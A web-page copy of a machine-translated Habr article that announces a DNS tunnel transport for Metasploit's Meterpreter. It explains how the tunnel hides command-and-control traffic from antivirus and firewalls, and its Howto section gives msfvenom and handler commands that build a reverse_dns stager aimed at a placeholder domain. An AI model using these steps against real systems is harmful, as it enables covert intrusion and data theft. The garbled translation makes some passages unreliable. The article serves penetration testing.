<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Exfiltration in Metasploit: DNS Tunnel for Meterpreter</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The topic of a DNS tunnel for organizing a covert communication channel with a command server - (C2 or C & C) is not new, but one thing didn‚Äôt bother ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Exfiltration in Metasploit: DNS Tunnel for Meterpreter</h1><div class="post__text post__text-html js-mediator-article">  The topic of a DNS tunnel for organizing a covert communication channel with a command server - (C2 or C &amp; C) is not new, but one thing didn‚Äôt bother me for one thing - there was no implementation of a full-featured solution from the pentester (hacker) point of view (apart from custom things for myself).  There was no convenient way to load the paylod and remote agent (Trojan) control in one bottle without using third-party services like Iodine or DNSCat2, which were not created for covertly staying in the system and made a lot of local noise: opened TCP ports, opened active connections independently and in general hung as a separate process, and all this is characterized by one word - ‚Äúpale‚Äù. <br><br>  A year ago, within the framework of our DEF CON group DC7812, purely for the sake of ‚Äúfun and profit‚Äù and for the benefit of the community, we set ourselves the task of solving this problem and making a normal DNS tunnel in the Metasploit transport for the Meterpreter agent (for now only for MS Windows).  In other words, for Meterpreter to use this tunnel in its own way.  Obviously, this also meant creating a stager load (shellcodes), so that this same meterpreter (or other MSF other payload) would be loaded via the same DNS directly from the process.  Thus, we will have the standard native support of transport, which will add additional features for pentesters.  Well, I am pleased to announce that we have completed the development and now anyone can use it or at least potestit.  Under the cut, you can read about interesting features and the possibilities of our development (as we told at the ZeroNights conference held in Moscow in November). <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/qq/84/ko/qq84koww4m79rw1irw1gew_dlkk.png" height="150%" width="150%"></div><a name="habracut"></a><br>  <b>Meterpreter</b> is a fairly well-known and popular remote control agent as part of the <b>Metasploit</b> framework.  This agent is quite flexible and convenient, with a bunch of modules and plugins and an API type that allows you to create your own plugins and modules.  But unfortunately, features such as transport are part of the core engine, and this means that we are not getting rid of the module here.  Currently Meterpreter supports the following types of network transport: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  Binding TCP port </li><li>  Reverse connection over TCP / IP </li><li>  Reverse connection over HTTP </li></ul><br><h3>  Designed Components </h3><br>  In our current version of pre-release, we have made DNS transport support only for Windows OS (for x64 and x86), which is implemented in the following components: <br><br><ul><li>  <a href="https://github.com/defcon-russia/metasploit-payloads/blob/master/python/meterpreter/dns_server.py">DNS MSF Bridge</a> (essentially "proxy") </li><li>  <a href="">Meterpreter DNS transport</a> (implementation of transport in the agent) </li><li>  <a href="">MSF stager payloads</a> (shellcodes, x64 / x86) </li></ul><br>  <b>DNS MSF Bridge</b> is one of the key components of the system.  In essence, this is a Python script that works as a DNS service that will be responsible for resolving names and returning data to the agent in the form of RR records.  This interface is the essence of the organization of the DNS tunnel for shellcode or agent Meterpreter.  At the same time, the same service will open a normal TCP port, for a connection from the Metasploit console, via a normal TCP.  Thus, the pentester does not need to think about how to make MSF handler and leptop available for DNS.  The whole task boils down to throwing this script on your server (AWS Ec2), having your own domain, NS records on it and not sweating from where and how the pentester works - extremely convenient (for my taste).  In addition, this solution allows multiple pentesters to work with the same DNS, but with different loads at the same time.  The current version supports up to 26 simultaneously open meterpreter sessions.  At the moment we do not have native support for the DNS service on Ruby in MSF itself, but work on it is already underway by the Metasploit community (specifically, <b>RageLtMan</b> ). <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/6m/mm/jo/6mmmjoa5if-poeyoan5fdwxyel0.png"></div><br>  The tunnel itself is organized through two types of RR records (optional): <b>DNSKEY</b> RR and <b>AAAA</b> RR.  This means that all of these implementations are filed in all components, including shellcodes. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/_y/ul/-c/_yul-czrtpipenfbla3mayemghk.png"></div><br>  Actually, the work of the transport looks like this: MSF handler (pentester) connects to our service, sends a payload (for example, meterpreter body) to our DNS and waits ... Then, conditionally, someone and our exploit and our shellcode works somewhere, downloads meterpreter, runs it in the context of the same process, and already meterpreter itself, using the same transport and DNS, organizes duplex communication with MSF handler (pentester).  Then the pentester can do anything - migrate to another process, open an interactive command shell, use mimikatz, etc., etc. - all this will be hidden by our tunnel.  At all stage killchain (after operation) we use the same transport and we do not need to upload additional DNScat2 binaries to the target machine or run Powershell, we are hidden from the very beginning by the tunnel.  In addition, we do not have overhead on TCP / IP tunneling (headers), only meterpreter TLV packets and data. <br><br>  Separately, I will add a few words about the organization of the tunnel from the side of the shellcode and meterpreter.  If, for example, DNSCat2 uses the actual name resolution implementation (that is, it implements a TCP / UDP connection), in our case we use the Windows API: DnsQuery, which allows us to shift the network connection implementation to MS DNSCache, that is, the network connection will be implemented directly svchost.exe, not a hacked process or meterpreter.  This is a very good feature that will allow you to bypass a number of problems with EPP / AV and personal firewall, which are actively working on the victim's workstation, and monitor new suspicious connections.  So it looks like: <br><br><img src="https://habrastorage.org/webt/gv/vi/b_/gvvib_e4lyy-phlvbhojqk30coo.png"><br><br>  Connections not visible, +5 invisibility 8) <br><br>  Well, the classic theme of the tunnel - in any case, the connection does not go to the Internet, but to a local DNS server, that is, with a router or whatever is going to be registered in the network (AD) corp.  In fact, it also allows you to gain control over machines that cannot walk straight to the Internet.  Separately, here I can remember that in my experience there were stories when it pulled out a penset - a tunnel with a passport for peilod c DNS, allowed me to send emails and receive punctures from targets in ‚Äúisolated zones‚Äù.  In addition, I recently tested the feature of one NextGen product - ‚Äúisolation of a compromised host‚Äù, and so meterpreter c DNS tunnels this isolation turned out to be nothing. 8) There are a lot of bonuses and buns in short, but there is also a negative side - speed and network anomalies.  About speed - it depends strongly on the environment and local DNS, and can vary greatly.  I took measurements in the home network and in the building.  network and here are the results: <br><br>  <b>Upload</b> <br>  <b>base32</b> - from 1 KB / sec to 4 KB / sec <br>  <b>Downlink</b> <br>  <b>AAAA</b> - from 4 KB / sec to 16 KB / sec <br>  <b>DNSKEY</b> - from 86 KB / sec to 660 KB / sec <br><br>  As you can see, using DNSKEY tunnel gives a very decent speed.  Shellcode downloads the body at the time of the splicing in 2 seconds, this is very acceptable for my taste.  Nevertheless, small breaks and sticks occur as a whole (by experience).  AAAA tunnel more imperceptible on the one hand = more fragmented requests, and AAAA requests themselves are not uncommon in logs. <br><br><h3>  Howto </h3><br><ul><li>  git clone and budle install <a href="https://github.com/defcon-russia/metasploit-framework">github.com/defcon-russia/metasploit-framework</a> </li><li>  You need to have a domain, shorter, something like: msf.ws </li><li>  Need a place to host with static IP (say IP 1.2.3.4) </li><li>  Configure NS records on msf.ws and our IP </li><li>  Fill the MSF Bridge DNS on the server and launch </li></ul><br><blockquote>  ./dns_server.py --ipaddr 1.2.3.4 --domain msf.ws </blockquote><br><ul><li>  Prepare a stager paylod (shellcode) </li></ul><br><blockquote>  ./msfvenom -p windows / meterpreter / reverse_dns DOMAIN = msf.ws RHOST = 1.2.3.4 </blockquote><br><ul><li>  Trouble with our shellcode </li><li>  Run the MSF handler </li></ul><br><blockquote>  use exploit / multi / handler <br>  set payload windows / meterpreter / reverse_dns <br>  set DOMAIN msf.ws <br>  set RHOST 1.2.3.4 <br>  run <br></blockquote><br><ul><li>  We deliver to the target and wait for the sessions. </li></ul><br>  <b>Future plans</b> <br><br>  The main task that is being done now is the merging into the main branch of MSF, that is, our task is to make this transport not just a fork, but to become part of Metasploit.  The process is already underway and thanks to <b>RageLtMan</b> for taking up this part of the work, which includes the creation of a native DNS handler.  We think that next year it will not be just a cool foroc, but will become part of the project. <br><br>  As soon as this transport becomes part of the project ‚Äúofficially‚Äù, you can begin to think about different features: <br><br><ul><li>  XOR encryption for stager </li><li>  Powershell / VBS stagers </li><li>  Support for other platforms and OS </li><li>  More types of DNS tunnels: TXT, NULL, etc. </li></ul><br>  If you want to participate in something like that, write to us. <br><br>  In any case, you can always talk about these and other interesting tasks on IRC (freenode.org #Metasploit, ask for <b>max3raza</b> and <b>RageLtMan for the tunnel</b> ). <br><br>  If the topic of information security is interesting at all, then our group DC 7812 telegram chat <br>  <a href="https://t.me/DCG7812">t.me/DCG7812</a> sometimes we hold group meetings and online streaming, if you have ideas or want to participate in the movement - welcome! .. <br><br>  Project sources (MSF fork with our features): <br><br>  <a href="https://github.com/defcon-russia/metasploit-framework">https://github.com/defcon-russia/metasploit-framework</a> <br>  <a href="https://github.com/defcon-russia/metasploit-payloads">https://github.com/defcon-russia/metasploit-payloads</a> <br><br>  <a href="https://defcon-russia.ru/meetups/zn2017/ms.pdf%3Fdwl">Slides with ZeroNights.</a> <br><br>  Demo video: <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/Lzb8LFt8Whg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div><p>Source: <a href="https://habr.com/ru/post/345056/">https://habr.com/ru/post/345056/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../345044/index.html">How to make an internal product external. Experience team Yandeks.Trekera</a></li>
<li><a href="../345046/index.html">How to successfully teach yourself to program</a></li>
<li><a href="../345048/index.html">The birth of the supernova: how new features appear on the example of 3D visitors counting</a></li>
<li><a href="../345050/index.html">Micromodule data centers - solution for small VPS / VDS providers</a></li>
<li><a href="../345052/index.html">Focus groups for user research: participant's impressions, criticism and adaptation of the method</a></li>
<li><a href="../345058/index.html">Another theft through SWIFT. Now in Russia</a></li>
<li><a href="../345060/index.html">Top 10 React Libraries on GitHub</a></li>
<li><a href="../345062/index.html">The battlefield is augmented reality. Part III: engine capabilities, animation and POI</a></li>
<li><a href="../345064/index.html">First look at the RPG: it turns out, this is not only role-playing games</a></li>
<li><a href="../345066/index.html">How we overcame iron obstacles in test automation</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>